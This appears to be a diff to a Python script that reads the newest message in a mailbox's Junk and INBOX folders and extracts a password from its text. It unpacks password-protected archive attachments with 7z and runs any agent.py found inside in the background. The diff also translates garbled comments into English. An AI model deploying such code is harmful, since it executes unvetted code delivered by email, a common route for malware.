@@ -83,23 +83,23 @@ def save_part_to_file(part, path: str | Path) -> None:
     data = part.get_payload(decode=True) or b""
 
     path = Path(path)
-    # 1) РіР°СЂР°РЅС‚РёСЂСѓРµРј, С‡С‚Рѕ РєР°С‚Р°Р»РѕРіРё СЃСѓС‰РµСЃС‚РІСѓСЋС‚
+    # 1) Ensure directories exist
     path.parent.mkdir(parents=True, exist_ok=True)
 
-    # 2) Р°С‚РѕРјР°СЂРЅР°СЏ Р·Р°РїРёСЃСЊ С‡РµСЂРµР· РІСЂРµРјРµРЅРЅС‹Р№ С„Р°Р№Р» РІ С‚РѕР№ Р¶Рµ РґРёСЂРµРєС‚РѕСЂРёРё
+    # 2) Atomic write via temporary file in same directory
     with tempfile.NamedTemporaryFile(dir=path.parent, delete=False) as tmp:
         tmp.write(data)
         tmp.flush()
         os.fsync(tmp.fileno())
         tmppath = Path(tmp.name)
 
-    # (РѕРїС†РёРѕРЅР°Р»СЊРЅРѕ) Р·Р°РґР°С‚СЊ РїСЂР°РІР°, РµСЃР»Рё РЅСѓР¶РЅРѕ РїСЂРёРІР°С‚РЅРµРµ
+    # (optional) Set permissions if needed
     try:
         os.chmod(tmppath, 0o600)
     except PermissionError:
         pass
 
-    # 3) Р°С‚РѕРјР°СЂРЅР°СЏ Р·Р°РјРµРЅР°
+    # 3) Atomic replace
     tmppath.replace(path)
 
 
@@ -154,64 +154,79 @@ def main() -> int:
     try:
         imap = imaplib.IMAP4(IMAP_HOST, IMAP_PORT)
         imap.login(MAIL_USER, pw)
-        imap.select("Junk")
-        typ, data = imap.search(None, "ALL")
-        if typ != "OK":
-            log(f"IMAP search failed: {typ}")
-            return 1
-        ids = data[0].split()
-        if not ids:
-            return 0
-        # Process only the latest message
-        for msg_id in ids[-1:]:
+
+        # Check both INBOX and Junk folders
+        for folder in ["INBOX", "Junk"]:
             try:
-                t, d = imap.fetch(msg_id, "(RFC822)")
-                if t != "OK":
+                typ, data = imap.select(folder)
+                if typ != "OK":
+                    log(f"IMAP select failed for {folder}: {typ}")
                     continue
-                raw = d[0][1]
-                msg = email.message_from_bytes(raw)
-                try:
-                    eml_path = DOWNLOAD_DIR / "email.eml"
-                    cleaned = (
-                        raw.decode("utf-8", errors="replace")
-                        .replace("\r\n", "\n")
-                        .replace("\r", "\n")
-                    )
-                    cleaned = re.sub("\n{3,}", "\n\n", cleaned).replace("\n", "\r\n")
-                    DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
-                    eml_path.write_text(cleaned, encoding="utf-8", newline="")
-                except Exception as e:
-                    log(f"Failed to save email.eml: {e}")
-                text = extract_all_text(msg)
-                pwd = find_password(text) or ""
-                print("Extracted password from email: " + pwd)
-                saved = []
-                for part in msg.walk():
-                    fname = part.get_filename()
-                    if is_archive_part(part, fname):
-                        name = fname or "archive.bin"
-                        dst = DOWNLOAD_DIR / name
-                        print(f"Saving to: {dst}")
-                        save_part_to_file(part, dst)
-                        saved.append(dst)
-                # Try to extract each saved archive
-                for arch in saved:
-                    arch = Path(arch)
+        
+                typ, data = imap.search(None, "ALL")
+                if typ != "OK":
+                    log(f"IMAP search failed in {folder}: {typ}")
+                    continue
+                
+                ids = data[0].split()
+                if not ids:
+                    continue
+                
+                # Process only the latest message
+                for msg_id in ids[-1:]:
                     try:
-                        outdir = DOWNLOAD_DIR / f"{arch.stem}_extracted"
-                        print(f"Looking in {outdir}")
-                        extract_with_7z(arch, pwd, outdir)
-                        agent = find_agent_py(outdir)
-                        if agent:
-                            run_agent_background(agent)
-                            log(f"Started agent from {agent}")
-                    except subprocess.CalledProcessError:
-                        log(f"Extraction failed for {arch}")
-                # mark as seen
-                imap.store(msg_id, "+FLAGS", "\\Seen")
+                        t, d = imap.fetch(msg_id, "(RFC822)")
+                        if t != "OK":
+                            continue
+                        raw = d[0][1]
+                        msg = email.message_from_bytes(raw)
+                        try:
+                            eml_path = DOWNLOAD_DIR / "email.eml"
+                            cleaned = (
+                                raw.decode("utf-8", errors="replace")
+                                .replace("\r\n", "\n")
+                                .replace("\r", "\n")
+                            )
+                            cleaned = re.sub("\n{3,}", "\n\n", cleaned).replace("\n", "\r\n")
+                            DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
+                            eml_path.write_text(cleaned, encoding="utf-8", newline="")
+                            print(f"Saved email.eml from {folder}")
+                        except Exception as e:
+                            log(f"Failed to save email.eml: {e}")
+                        text = extract_all_text(msg)
+                        pwd = find_password(text) or ""
+                        print("Extracted password from email: " + pwd)
+                        saved = []
+                        for part in msg.walk():
+                            fname = part.get_filename()
+                            if is_archive_part(part, fname):
+                                name = fname or "archive.bin"
+                                dst = DOWNLOAD_DIR / name
+                                print(f"Saving to: {dst}")
+                                save_part_to_file(part, dst)
+                                saved.append(dst)
+                        # Try to extract each saved archive
+                        for arch in saved:
+                            arch = Path(arch)
+                            try:
+                                outdir = DOWNLOAD_DIR / f"{arch.stem}_extracted"
+                                print(f"Looking in {outdir}")
+                                extract_with_7z(arch, pwd, outdir)
+                                agent = find_agent_py(outdir)
+                                if agent:
+                                    run_agent_background(agent)
+                                    log(f"Started agent from {agent}")
+                            except subprocess.CalledProcessError:
+                                log(f"Extraction failed for {arch}")
+                        # mark as seen
+                        imap.store(msg_id, "+FLAGS", "\\Seen")
+                    except Exception as e:
+                        log(f"Process message error in {folder}: {e}")
+                        continue
             except Exception as e:
-                log(f"Process message error: {e}")
+                log(f"Error processing folder {folder}: {e}")
                 continue
+
         imap.logout()
         return 0
     except Exception as e:
